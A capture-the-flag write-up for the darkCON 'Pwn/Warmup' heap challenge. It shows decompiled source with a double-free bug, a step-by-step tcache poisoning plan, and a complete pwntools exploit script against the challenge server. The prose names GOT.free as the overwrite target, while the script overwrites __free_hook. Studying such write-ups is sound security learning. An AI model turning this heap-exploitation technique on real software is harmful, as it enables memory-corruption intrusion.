# Pwn/Warmup [482]

warm up yourself and get the flag!

Connection: nc 65.1.92.179 49155

**Files**: [warmup1.zip](https://darkc0n.blob.core.windows.net/challenges/warmup1.zip) (`libc.so.6`, `a.out`)

```sh
$ ./libc-database/identify libc.so.6
libc6_2.27-3ubuntu1.2_amd64
$ checksec a.out
[*] '/a.out'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solving

The challenge is a basic heap-based CLI, with the flag stored at `notes[0]`:

```c
unsigned int initstuff() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  return alarm(0x20);
}
int show_options() {
  puts("[1] - create");
  puts("[2] - delete");
  return puts("[3] - exit");
}

char *notes[16]; // .bss:00000000006020C0
int main() {
  initstuff();
  notes[0] = malloc(0x10);
  strcpy(notes[0], "darkCON{XXXXXXX}"); // note that this is embedded as mov instructions
  printf("Hello traveller! Here is a gift: %p\n", &strcpy);
  while ( 1 ) {
    int opt; // [rsp+4h] [rbp-Ch] BYREF
    show_options();
    __isoc99_scanf("%d", &opt);
    fgetc(stdin);
    switch (opt) {
      case 1:
        create(); break;
      case 2:
        delete(); break;
      case 3:
        exit(0); break;
      default:
        return 0;
    }
  }
}
```

The challenge provides a libc leak via "`strcpy`" -- the value of this leak doesn't actually match `libc.symbols['strcpy']`, so I found it manually with gdb:

```python
__strcpy_sse2_unaligned = 0xb65b0 #gdb.attach(r, gdbscript='x/g 0x601FE8\nvmmap libc')
```

In the main loop, there are only two options: `create()`, and `delete()`. 

```c
unsigned getindex() {
  int ind; // [rsp+4h] [rbp-Ch] BYREF
  printf("index: ");
  __isoc99_scanf("%d", &ind);
  fgetc(stdin);
  if ( ind > 15 || ind < 0 )
    exit(0);
  return (unsigned)ind;
}
int sizes[16]; // .bss:0000000000602140
void create() {
  char s[72]; // [rsp+10h] [rbp-50h] BYREF
  int ind = getindex(); // [rsp+Ch] [rbp-54h]
  printf("size: ");
  __isoc99_scanf("%d", &sizes[ind]);
  fgetc(stdin);
  if (sizes[ind] <= 32 && sizes[ind] > 0) {
    printf("input: ");
    fgets(s, sizes[ind], stdin);  // this should be capped at 32 bytes.
    notes[ind] = malloc(sizes[ind]);
    strcpy(notes[ind], s);        // this shouldn't overflow.
  }
}
void delete(){
  int ind = getindex(); // [rsp+Ch] [rbp-4h]
  free(notes[ind]);     // UAF ! notes[] & sizes[] are not cleared.
}
```

The UAF can really only be used to induce a double free: there's no `edit()` like function to make use of an already-freed block.

I get [an idea](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup_into_stack.c) for leaking `notes[0]` pretty quickly:

1. double-free a note, causing the tcache freelist to become [1 -> 2 -> 1]. This works because we're in libc 2.27.
2. Use the first allocation of [1] to overwrite its `->fd` pointer to `GOT.free()`.
3. Allocate twice to let the GOT pointer reach the head of the tcache
4. Allocate && overwrite `GOT.free()` with `puts()`
5. free [0] to get flag

That works:

```
[*] Switching to interactive mode
darkCON{shrtflg}
[1] - create
[2] - delete
[3] - exit
$
```

## Solve script

```python
from pwnscripts import *
context.binary = 'a.out'
context.libc_database = 'libc-database'
context.libc = 'libc.so.6' # libc6_2.27-3ubuntu1.2_amd64

r = remote('65.1.92.179', 49155)
#r = context.binary.process()
def create(ind: int, size: int, inp: bytes):
    r.sendlineafter('exit\n', '1')
    r.sendlineafter('index: ', str(ind))
    r.sendlineafter('size: ', str(size))
    if len(inp) < size-1: inp += b'\n'
    r.sendafter('input: ', inp)
def delete(ind: int):
    r.sendlineafter('exit\n', '2')
    r.sendlineafter('index: ', str(ind))

__strcpy_sse2_unaligned = 0xb65b0 # ???
context.libc.address = unpack_hex(r.recvline())-__strcpy_sse2_unaligned
create(1, 8, b'one')
create(2, 8, b'two')
delete(1)
delete(2)
delete(1)
create(1, 8, pack(context.libc.symbols['__free_hook'])[:7])
create(2, 8, b'two')
create(1, 8, b'one')
create(1, 8, pack(context.libc.symbols['puts'])[:7])
delete(0)
r.interactive()
```

